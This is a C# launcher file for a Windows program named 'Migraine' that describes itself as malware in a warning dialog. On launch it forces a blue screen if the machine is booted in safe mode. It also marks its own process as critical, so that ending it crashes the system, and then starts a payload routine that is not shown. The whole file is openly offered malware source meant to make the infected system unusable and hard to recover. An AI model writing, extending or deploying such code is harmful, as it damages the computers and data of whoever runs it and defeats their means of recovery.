using Library;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Migraine
{
    static class Startup
    {
        [STAThread]
        static void Main()
        {
            if (File.Exists(variables.ExtractPath + "\\Unpacked.bin"))
            {
                if (SystemInformation.BootMode != BootMode.Normal)
                {
                    SystemExec.BSOD();
                }
                SetProcessCritical.Init();
                Migraine.Main.Init();
            }
            else
            {
                MessageBoxManager.Yes = "Hurt me plenty";
                MessageBoxManager.Register();
                if (MessageBox.Show("THIS IS NOT A JOKE!\n" + "The program you considered executing is classified as malware\n" + "You executing this program will infect your system, are you sure you want to execute the program infecting your system?", "Migraine", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    File.Create(variables.ExtractPath + "\\Unpacked.bin");
                    MessageBoxManager.Unregister();
                    SetProcessCritical.Init();
                    Migraine.Main.Init();
                }
                else
                {
                    MessageBoxManager.Unregister();
                    Application.Exit();
                }
            }
        }
    }
}
